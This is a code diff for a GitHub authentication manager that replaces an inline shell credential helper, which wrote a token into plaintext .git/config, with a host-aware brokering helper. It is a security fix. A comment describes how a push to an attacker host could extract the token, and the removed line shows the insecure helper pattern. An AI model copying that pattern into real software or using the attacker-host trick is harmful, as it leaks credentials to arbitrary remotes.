@@ -1,7 +1,7 @@
 import { EventEmitter } from "node:events";
-import { execSync } from "node:child_process";
+import { execFileSync } from "node:child_process";
 import type { CredentialStore } from "./credential-store.js";
-import { setGitIdentity, setGlobalCredentialHelper, clearGlobalCredentialHelper } from "./git-config.js";
+import { setGitIdentity, setGlobalCredentialHelper, clearGlobalCredentialHelper, CONTAINER_CREDENTIAL_HELPER } from "./git-config.js";
 // Sub-module imports — delegated implementations
 import { createRepo as createRepoImpl, listUserRepos as listUserReposImpl, searchRepos as searchReposImpl, checkRepoWriteAccess as checkRepoWriteAccessImpl } from "./github-auth-repos.js";
 import { createPullRequest as createPullRequestImpl, findPullRequest as findPullRequestImpl, findPullRequestAnyState as findPullRequestAnyStateImpl, mergePullRequest as mergePullRequestImpl, enableAutoMerge as enableAutoMergeImpl, disableAutoMerge as disableAutoMergeImpl, updatePullRequest as updatePullRequestImpl, addPullRequestComment as addPullRequestCommentImpl, addLabelsToPullRequest as addLabelsToPullRequestImpl, markPullRequestReady as markPullRequestReadyImpl, listPullRequests as listPullRequestsImpl, viewPullRequest as viewPullRequestImpl, getPullRequestNodeId as getPullRequestNodeIdImpl } from "./github-auth-prs.js";
@@ -209,8 +209,41 @@ export class GitHubAuthManager extends EventEmitter {
   }
 
   /**
-   * Configure git credential helper and user identity in a workspace repo
-   * so that push/pull work with the stored token.
+   * Point a workspace repo's *local* `.git/config` at the brokering
+   * `shipit-git-credential` helper so push/pull resolve the token at git-time
+   * instead of embedding it.
+   *
+   * SECURITY (docs/172 Gap 2 / SHI-72): this method used to write an inline
+   * shell helper — `!f() { echo "password=<PAT>"; … }; f` — into the local
+   * config. That was wrong in two compounding ways:
+   *   1. The literal `ghp_…` token landed in plaintext in `/workspace/.git/config`,
+   *      which is agent-readable inside the session container (a plain file read
+   *      leaks it — no git invocation needed).
+   *   2. The inline helper was host-blind: it echoed the token for *any* host git
+   *      fed it, so `git push https://attacker.com/…` (or `git credential fill`
+   *      for an attacker host) handed the PAT to an arbitrary remote. It also
+   *      *shadowed* the host-aware broker that the container's global gitconfig
+   *      already installs, since a local helper is consulted alongside the global
+   *      one.
+   *
+   * The fix routes the workspace through the same {@link CONTAINER_CREDENTIAL_HELPER}
+   * the container's global gitconfig uses ({@link writeContainerGitConfig}). The
+   * broker resolves the token over localhost at git-time and only for the
+   * configured GitHub host (see `getGitCredential`) — never echoing it for
+   * other hosts and never writing it to disk.
+   *
+   * Both git execution contexts stay correct:
+   *   - In the container, the local helper *is* the broker → host-aware, token-free.
+   *   - On the orchestrator, the global inline helper (set by `setGlobalCredentialHelper`,
+   *     which always runs whenever a token exists) is consulted first and fills
+   *     the credential, so the broker path — which doesn't exist on the
+   *     orchestrator host — is never invoked. Push/pull to github.com is
+   *     unaffected.
+   *
+   * `--replace-all` is used so a workspace that still carries a pre-fix inline
+   * token helper (or any duplicate entries) is remediated to the single broker
+   * value on the next configure call.
+   *
    * @param targetDir - Optional directory to configure. Defaults to the instance's workspaceDir.
    */
   configureGitCredentials(targetDir?: string): void {
@@ -218,12 +251,10 @@ export class GitHubAuthManager extends EventEmitter {
 
     const cwd = targetDir ?? this.workspaceDir;
     try {
-      const opts = { cwd, stdio: "pipe" as const };
-      // Use a credential helper that returns the token as the password.
-      // The helper is a shell one-liner that echoes the token.
-      execSync(
-        `git config credential.helper '!f() { echo "password=${this._token}"; echo "username=x-access-token"; }; f'`,
-        opts,
+      execFileSync(
+        "git",
+        ["config", "--replace-all", "credential.helper", CONTAINER_CREDENTIAL_HELPER],
+        { cwd, stdio: "pipe" },
       );
       // User identity is inherited from global git config (set by setToken/loadUserInfo).
     } catch (err) {
